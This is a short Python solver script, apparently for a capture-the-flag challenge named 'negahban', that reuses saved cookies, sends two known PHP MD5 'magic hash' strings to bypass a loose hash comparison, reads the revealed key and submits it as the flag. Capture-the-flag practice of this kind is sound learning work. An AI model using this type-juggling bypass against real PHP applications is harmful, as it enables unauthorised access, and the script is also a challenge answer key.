import requests
import http.cookiejar
import re

def solve_negahban(cookie_path="cookies.txt"):
    session = requests.Session()
    cj = http.cookiejar.MozillaCookieJar(cookie_path)
    cj.load(ignore_discard=True, ignore_expires=True)
    session.cookies = cj

    # Magic hashes in PHP MD5 type juggling
    sanad1 = "240610708"
    sanad2 = "QNKCDZO"

    r = session.post("https://256.yektanet.tech/ramzolmasal/api/negahban", data={"sanad1": sanad1, "sanad2": sanad2})
    match = re.search(r'<code>([a-f0-9]+)</code>', r.text)
    if match:
        freedom_key = match.group(1)
        print(f"Freedom Key found: {freedom_key}")
        session.post("https://256.yektanet.tech/ramzolmasal/api/select", json={"id": "negahban"})
        res = session.post("https://256.yektanet.tech/ramzolmasal/api/submit", json={"flag": f"YEK{{{freedom_key}}}"}).json()
        print(f"Submit result: {res}")
        return freedom_key
    else:
        print("Failed to find freedom key in response:", r.text[:200])

if __name__ == "__main__":
    solve_negahban()
